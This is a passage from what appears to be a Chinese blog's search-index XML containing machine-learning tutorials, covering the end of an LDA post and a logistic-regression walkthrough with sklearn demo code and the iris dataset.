 0  0  0  2] [ 0  0 14  0  0  0  0  0  0  0] [ 0  0  0 22  0  0  0  0  0  0] [ 0  0  0  0 17  0  0  0  3  1] [ 0  0  0  0  0 16  0  0  0  0] [ 0  1  0  0  0  0 17  0  0  0] [ 0  0  0  0  0  0  0 17  0  1] [ 0  2  0  0  0  0  0  0 16  1] [ 0  0  0  0  0  0  0  0  1 15]]</code></pre><p><img "" class="lazyload placeholder" data-original="output_22_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><h1 id="5算法重要知识点"><a class="markdownIt-Anchor" href="#5算法重要知识点">#</a> 5. 算法重要知识点</h1><p>LDA 算法的一个目标是使得不同类别之间的距离越远越好，同一类别之中的距离越近越好。那么不同类别之间的距离越远越好，我们是可以理解的，就是越远越好区分。同时，协方差不仅是反映了变量之间的相关性，同样反映了多维样本分布的离散程度（一维样本使用方差），协方差越大（对于负相关来说是绝对值越大），表示数据的分布越分散。所以上面的 “欲使同类样例的投影点尽可能接近，可以让同类样本点的协方差矩阵尽可能小” 就可以理解了。</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>J</mi><mo stretchy="false">(</mo><mi>w</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><msup><mi>w</mi><mi>T</mi></msup><msup><mrow><mi mathvariant="normal">∣</mi><msub><mi>u</mi><mn>1</mn></msub><mo>−</mo><msub><mi>u</mi><mn>2</mn></msub><mi mathvariant="normal">∣</mi></mrow><mn>2</mn></msup></mrow><mrow><msubsup><mi>s</mi><mn>1</mn><mn>2</mn></msubsup><mo>+</mo><msubsup><mi>s</mi><mn>2</mn><mn>2</mn></msubsup></mrow></mfrac></mrow><annotation encoding="application/x-tex">J(w) = \frac{w^T{|u_1-u_2|}^2}{s_1^2+s_2^2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.09618em;">J</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.583316em;vertical-align:-0.9523079999999999em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.631008em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7959080000000001em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.0448000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7959080000000001em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.0448000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord"><span class="mord"><span class="mord">∣</span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathnormal">u</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord">∣</span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.954008em;"><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9523079999999999em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>如上述公式<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>J</mi><mo stretchy="false">(</mo><mi>w</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">J(w)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.09618em;">J</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mclose">)</span></span></span></span> 所示，分子为投影数据后的均值只差，分母为方差之后，LDA 的目的就是使得 J 值最大化，那么可以理解为最大化分子，即使得类别之间的距离越远，同时最小化分母，使得每个类别内部的方差越小，这样就能使得每个类类别的数据可以在投影矩阵 w 的映射下，分的越开。</p><p>需要注意的是，LDA 模型适用于线性可分数据，对于上述实战中用到的 MNIST 手写数据（其实是非线性的），但是依然可以取得较好的分类效果；但在以后的实战中需要注意 LDA 在非线性可分数据上的谨慎使用。</p>]]></content>
      
      
      <categories>
          
          <category> 天池机器学习入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于逻辑回归的分类预测</title>
      <link href="/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8E%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%E7%9A%84%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/"/>
      <url>/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8E%E9%80%BB%E8%BE%91%E5%9B%9E%E5%BD%92%E7%9A%84%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="机器学习算法一-基于逻辑回归的分类预测"><a class="markdownIt-Anchor" href="#机器学习算法一-基于逻辑回归的分类预测">#</a> 机器学习算法（一）: 基于逻辑回归的分类预测</h1><h2 id="逻辑回归的介绍和应用"><a class="markdownIt-Anchor" href="#逻辑回归的介绍和应用">#</a> 逻辑回归的介绍和应用</h2><h3 id="11-逻辑回归的介绍"><a class="markdownIt-Anchor" href="#11-逻辑回归的介绍">#</a> 1.1 逻辑回归的介绍</h3><p>逻辑回归（Logistic regression，简称 LR）虽然其中带有 &quot;回归&quot; 两个字，但逻辑回归其实是一个分类模型，并且广泛应用于各个领域之中。虽然现在深度学习相对于这些传统方法更为火热，但实则这些传统方法由于其独特的优势依然广泛应用于各个领域中。</p><p>而对于逻辑回归而且，最为突出的两点就是其模型简单和模型的可解释性强。</p><p>逻辑回归模型的优劣势:</p><ul><li>优点：实现简单，易于理解和实现；计算代价不高，速度很快，存储资源低；</li><li>缺点：容易欠拟合，分类精度可能不高</li></ul><h3 id="12-逻辑回归的应用"><a class="markdownIt-Anchor" href="#12-逻辑回归的应用">#</a> 1.2 逻辑回归的应用</h3><p>逻辑回归模型广泛用于各个领域，包括机器学习，大多数医学领域和社会科学。例如，最初由 Boyd 等人开发的创伤和损伤严重度评分（TRISS）被广泛用于预测受伤患者的死亡率，使用逻辑回归 基于观察到的患者特征（年龄，性别，体重指数，各种血液检查的结果等）分析预测发生特定疾病（例如糖尿病，冠心病）的风险。逻辑回归模型也用于预测在给定的过程中，系统或产品的故障的可能性。还用于市场营销应用程序，例如预测客户购买产品或中止订购的倾向等。在经济学中它可以用来预测一个人选择进入劳动力市场的可能性，而商业应用则可以用来预测房主拖欠抵押贷款的可能性。条件随机字段是逻辑回归到顺序数据的扩展，用于自然语言处理。</p><p>逻辑回归模型现在同样是很多分类算法的基础组件，比如 分类任务中基于 GBDT 算法 + LR 逻辑回归实现的信用卡交易反欺诈，CTR (点击通过率) 预估等，其好处在于输出值自然地落在 0 到 1 之间，并且有概率意义。模型清晰，有对应的概率学理论基础。它拟合出来的参数就代表了每一个特征 (feature) 对结果的影响。也是一个理解数据的好工具。但同时由于其本质上是一个线性的分类器，所以不能应对较为复杂的数据情况。很多时候我们也会拿逻辑回归模型去做一些任务尝试的基线（基础水平）。</p><p>说了这些逻辑回归的概念和应用，大家应该已经对其有所期待了吧，那么我们现在开始吧！！！</p><h2 id="2-学习目标"><a class="markdownIt-Anchor" href="#2-学习目标">#</a> 2 学习目标</h2><ul><li>了解 逻辑回归 的理论</li><li>掌握 逻辑回归 的 sklearn 函数调用使用并将其运用到鸢尾花数据集预测</li></ul><h2 id="3-代码流程"><a class="markdownIt-Anchor" href="#3-代码流程">#</a> 3 代码流程</h2><p><strong>Part1 Demo 实践</strong></p><ul><li>Step1: 库函数导入</li><li>Step2: 模型训练</li><li>Step3: 模型参数查看</li><li>Step4: 数据和模型可视化</li><li>Step5: 模型预测</li></ul><p><strong>Part2 基于鸢尾花（iris）数据集的逻辑回归分类实践</strong></p><ul><li>Step1: 库函数导入</li><li>Step2: 数据读取 / 载入</li><li>Step3: 数据信息简单查看</li><li>Step4: 可视化描述</li><li>Step5: 利用 逻辑回归模型 在二分类上 进行训练和预测</li><li>Step5: 利用 逻辑回归模型 在三分类 (多分类) 上 进行训练和预测</li></ul><h2 id="4-算法实战"><a class="markdownIt-Anchor" href="#4-算法实战">#</a> 4 算法实战</h2><h3 id="41-demo实践"><a class="markdownIt-Anchor" href="#41-demo实践">#</a> 4.1 Demo 实践</h3><p><strong>Step1: 库函数导入</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##  基础函数库</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np </span><br><span class="line"></span><br><span class="line"><span class="comment">## 导入画图库</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"></span><br><span class="line"><span class="comment">## 导入逻辑回归模型函数</span></span><br><span class="line"><span class="keyword">from</span> sklearn.linear_model <span class="keyword">import</span> LogisticRegression</span><br></pre></td></tr></table></figure><p><strong>Step2: 模型训练</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##Demo演示LogisticRegression分类</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 构造数据集</span></span><br><span class="line">x_fearures = np.array([[-<span class="number">1</span>, -<span class="number">2</span>], [-<span class="number">2</span>, -<span class="number">1</span>], [-<span class="number">3</span>, -<span class="number">2</span>], [<span class="number">1</span>, <span class="number">3</span>], [<span class="number">2</span>, <span class="number">1</span>], [<span class="number">3</span>, <span class="number">2</span>]])</span><br><span class="line">y_label = np.array([<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">## 调用逻辑回归模型</span></span><br><span class="line">lr_clf = LogisticRegression()</span><br><span class="line"></span><br><span class="line"><span class="comment">## 用逻辑回归模型拟合构造的数据集</span></span><br><span class="line">lr_clf = lr_clf.fit(x_fearures, y_label) <span class="comment">#其拟合方程为 y=w0+w1*x1+w2*x2</span></span><br></pre></td></tr></table></figure><p><strong>Step3: 模型参数查看</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 查看其对应模型的w</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the weight of Logistic Regression:&#x27;</span>,lr_clf.coef_)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 查看其对应模型的w0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the intercept(w0) of Logistic Regression:&#x27;</span>,lr_clf.intercept_)</span><br></pre></td></tr></table></figure><pre><code>the weight of Logistic Regression: [[0.73455784 0.69539712]]the intercept(w0) of Logistic Regression: [-0.13139986]</code></pre><p><strong>Step4: 数据和模型可视化</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 可视化构造的数据样本点</span></span><br><span class="line">plt.figure()</span><br><span class="line">plt.scatter(x_fearures[:,<span class="number">0</span>],x_fearures[:,<span class="number">1</span>], c=y_label, s=<span class="number">50</span>, cmap=<span class="string">&#x27;viridis&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;Dataset&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="output_7_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可视化决策边界</span></span><br><span class="line">plt.figure()</span><br><span class="line">plt.scatter(x_fearures[:,<span class="number">0</span>],x_fearures[:,<span class="number">1</span>], c=y_label, s=<span class="number">50</span>, cmap=<span class="string">&#x27;viridis&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;Dataset&#x27;</span>)</span><br><span class="line"></span><br><span class="line">nx, ny = <span class="number">200</span>, <span class="number">100</span></span><br><span class="line">x_min, x_max = plt.xlim()</span><br><span class="line">y_min, y_max = plt.ylim()</span><br><span class="line">x_grid, y_grid = np.meshgrid(np.linspace(x_min, x_max, nx),np.linspace(y_min, y_max, ny))</span><br><span class="line"></span><br><span class="line">z_proba = lr_clf.predict_proba(np.c_[x_grid.ravel(), y_grid.ravel()])</span><br><span class="line">z_proba = z_proba[:, <span class="number">1</span>].reshape(x_grid.shape)</span><br><span class="line">plt.contour(x_grid, y_grid, z_proba, [<span class="number">0.5</span>], linewidths=<span class="number">2.</span>, colors=<span class="string">&#x27;blue&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img "" class="lazyload placeholder" data-original="output_8_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">### 可视化预测新样本</span></span><br><span class="line"></span><br><span class="line">plt.figure()</span><br><span class="line"><span class="comment">## new point 1</span></span><br><span class="line">x_fearures_new1 = np.array([[<span class="number">0</span>, -<span class="number">1</span>]])</span><br><span class="line">plt.scatter(x_fearures_new1[:,<span class="number">0</span>],x_fearures_new1[:,<span class="number">1</span>], s=<span class="number">50</span>, cmap=<span class="string">&#x27;viridis&#x27;</span>)</span><br><span class="line">plt.annotate(s=<span class="string">&#x27;New point 1&#x27;</span>,xy=(<span class="number">0</span>,-<span class="number">1</span>),xytext=(-<span class="number">2</span>,<span class="number">0</span>),color=<span class="string">&#x27;blue&#x27;</span>,arrowprops=<span class="built_in">dict</span>(arrowstyle=<span class="string">&#x27;-|&gt;&#x27;</span>,connectionstyle=<span class="string">&#x27;arc3&#x27;</span>,color=<span class="string">&#x27;red&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">## new point 2</span></span><br><span class="line">x_fearures_new2 = np.array([[<span class="number">1</span>, <span class="number">2</span>]])</span><br><span class="line">plt.scatter(x_fearures_new2[:,<span class="number">0</span>],x_fearures_new2[:,<span class="number">1</span>], s=<span class="number">50</span>, cmap=<span class="string">&#x27;viridis&#x27;</span>)</span><br><span class="line">plt.annotate(s=<span class="string">&#x27;New point 2&#x27;</span>,xy=(<span class="number">1</span>,<span class="number">2</span>),xytext=(-<span class="number">1.5</span>,<span class="number">2.5</span>),color=<span class="string">&#x27;red&#x27;</span>,arrowprops=<span class="built_in">dict</span>(arrowstyle=<span class="string">&#x27;-|&gt;&#x27;</span>,connectionstyle=<span class="string">&#x27;arc3&#x27;</span>,color=<span class="string">&#x27;red&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">## 训练样本</span></span><br><span class="line">plt.scatter(x_fearures[:,<span class="number">0</span>],x_fearures[:,<span class="number">1</span>], c=y_label, s=<span class="number">50</span>, cmap=<span class="string">&#x27;viridis&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;Dataset&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可视化决策边界</span></span><br><span class="line">plt.contour(x_grid, y_grid, z_proba, [<span class="number">0.5</span>], linewidths=<span class="number">2.</span>, colors=<span class="string">&#x27;blue&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\ipykernel_launcher.py:7: MatplotlibDeprecationWarning: The 's' parameter of annotate() has been renamed 'text' since Matplotlib 3.3; support for the old name will be dropped two minor releases later.  import sysc:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\ipykernel_launcher.py:12: MatplotlibDeprecationWarning: The 's' parameter of annotate() has been renamed 'text' since Matplotlib 3.3; support for the old name will be dropped two minor releases later.  if sys.path[0] == '':</code></pre><p><img "" class="lazyload placeholder" data-original="output_9_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><strong>Step5: 模型预测</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 在训练集和测试集上分别利用训练好的模型进行预测</span></span><br><span class="line">y_label_new1_predict = lr_clf.predict(x_fearures_new1)</span><br><span class="line">y_label_new2_predict = lr_clf.predict(x_fearures_new2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The New point 1 predict class:\n&#x27;</span>,y_label_new1_predict)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The New point 2 predict class:\n&#x27;</span>,y_label_new2_predict)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 由于逻辑回归模型是概率预测模型（前文介绍的 p = p(y=1|x,\theta)）,所以我们可以利用 predict_proba 函数预测其概率</span></span><br><span class="line">y_label_new1_predict_proba = lr_clf.predict_proba(x_fearures_new1)</span><br><span class="line">y_label_new2_predict_proba = lr_clf.predict_proba(x_fearures_new2)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The New point 1 predict Probability of each class:\n&#x27;</span>,y_label_new1_predict_proba)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The New point 2 predict Probability of each class:\n&#x27;</span>,y_label_new2_predict_proba)</span><br></pre></td></tr></table></figure><pre><code>The New point 1 predict class: [0]The New point 2 predict class: [1]The New point 1 predict Probability of each class: [[0.69567724 0.30432276]]The New point 2 predict Probability of each class: [[0.11983936 0.88016064]]</code></pre><h3 id="42-基于鸢尾花iris数据集的逻辑回归分类实践"><a class="markdownIt-Anchor" href="#42-基于鸢尾花iris数据集的逻辑回归分类实践">#</a> 4.2 基于鸢尾花（iris）数据集的逻辑回归分类实践</h3><p>在实践的最开始，我们首先需要导入一些基础的函数库包括：numpy （Python 进行科学计算的基础软件包），pandas（pandas 是一种快速，强大，灵活且易于使用的开源数据分析和处理工具），matplotlib 和 seaborn 绘图。</p><p><strong>Step1: 库函数导入</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##  基础函数库</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np </span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"><span class="comment">## 绘图函数库</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br></pre></td></tr></table></figure><p>本次我们选择鸢花数据（iris）进行方法的尝试训练，该数据集一共包含 5 个变量，其中 4 个特征变量，1 个目标分类变量。共有 150 个样本，目标变量为 花的类别 其都属于鸢尾属下的三个亚属，分别是山鸢尾 (Iris-setosa)，变色鸢尾 (Iris-versicolor) 和维吉尼亚鸢尾 (Iris-virginica)。包含的三种鸢尾花的四个特征，分别是花萼长度 (cm)、花萼宽度 (cm)、花瓣长度 (cm)、花瓣宽度 (cm)，这些形态特征在过去被用来识别物种。</p><table><thead><tr><th>变量</th><th>描述</th></tr></thead><tbody><tr><td>sepal length</td><td>花萼长度 (cm)</td></tr><tr><td>sepal width</td><td>花萼宽度 (cm)</td></tr><tr><td>petal length</td><td>花瓣长度 (cm)</td></tr><tr><td>petal width</td><td>花瓣宽度 (cm)</td></tr><tr><td>target</td><td>鸢尾的三个亚属类别，‘setosa’(0), ‘versicolor’(1), ‘virginica’(2)</td></tr></tbody></table><p><strong>Step2: 数据读取 / 载入</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 我们利用 sklearn 中自带的 iris 数据作为数据载入，</span></span><br><span class="line"><span class="comment">#并利用Pandas转化为DataFrame格式</span></span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_iris</span><br><span class="line">data = load_iris() <span class="comment">#得到数据特征</span></span><br><span class="line">iris_target = data.target <span class="comment">#得到数据对应的标签</span></span><br><span class="line">iris_features = pd.DataFrame(data=data.data, columns=data.feature_names) </span><br><span class="line"><span class="comment">#利用Pandas转化为DataFrame格式</span></span><br></pre></td></tr></table></figure><p><strong>Step3: 数据信息简单查看</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 利用.info()查看数据的整体信息</span></span><br><span class="line">iris_features.info()</span><br></pre></td></tr></table></figure><pre><code>&lt;class 'pandas.core.frame.DataFrame'&gt;RangeIndex: 150 entries, 0 to 149Data columns (total 4 columns): #   Column             Non-Null Count  Dtype  ---  ------             --------------  -----   0   sepal length (cm)  150 non-null    float64 1   sepal width (cm)   150 non-null    float64 2   petal length (cm)  150 non-null    float64 3   petal width (cm)   150 non-null    float64dtypes: float64(4)memory usage: 4.8 KB</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 进行简单的数据查看，我们可以利用 .head() 头部.tail()尾部</span></span><br><span class="line">iris_features.head()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre></style><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>sepal length (cm)</th>      <th>sepal width (cm)</th>      <th>petal length (cm)</th>      <th>petal width (cm)</th>    </tr>  </thead>  <tbody>    <tr>      <th>0</th>      <td>5.1</td>      <td>3.5</td>      <td>1.4</td>      <td>0.2</td>    </tr>    <tr>      <th>1</th>      <td>4.9</td>      <td>3.0</td>      <td>1.4</td>      <td>0.2</td>    </tr>    <tr>      <th>2</th>      <td>4.7</td>      <td>3.2</td>      <td>1.3</td>      <td>0.2</td>    </tr>    <tr>      <th>3</th>      <td>4.6</td>      <td>3.1</td>      <td>1.5</td>      <td>0.2</td>    </tr>    <tr>      <th>4</th>      <td>5.0</td>      <td>3.6</td>      <td>1.4</td>      <td>0.2</td>    </tr>  </tbody></table></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iris_features.tail()</span><br></pre></td></tr></table></figure><div><style scoped>    .dataframe tbody tr th:only-of-type {        vertical-align: middle;    }<pre><code>.dataframe tbody tr th &#123;    vertical-align: top;&#125;.dataframe thead th &#123;    text-align: right;&#125;</code></pre></style><table border="1" class="dataframe">  <thead>    <tr style="text-align: right;">      <th></th>      <th>sepal length (cm)</th>      <th>sepal width (cm)</th>      <th>petal length (cm)</th>      <th>petal width (cm)</th>    </tr>  </thead>  <tbody>    <tr>      <th>145</th>      <td>6.7</td>      <td>3.0</td>      <td>5.2</td>      <td>2.3</td>    </tr>    <tr>      <th>146</th>      <td>6.3</td>      <td>2.5</td>      <td>5.0</td>      <td>1.9</td>    </tr>    <tr>      <th>147</th>      <td>6.5</td>      <td>3.0</td>      <td>5.2</td>      <td>2.0</td>    </tr>    <tr>      <th>148</th>      <td>6.2</td>      <td>3.4</td>      <td>5.4</td>      <td>2.3</td>    </tr>    <tr>      <th>149</th>      <td>5.9</td>      <td>3.0</td>      <td>5.1</td>      <td>1.8</td>    </tr>  </tbody></table></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 其对应的类别标签为，其中0，1，2分别代表&#x27;setosa&#x27;, &#x27;versicolor&#x27;, &#x27;virginica&#x27;三种不同花的类别。</span></span><br><span class="line">iris_target</span><br></pre></td></tr></table></figure><pre><code>array([0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,       0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,       0, 0, 0, 0, 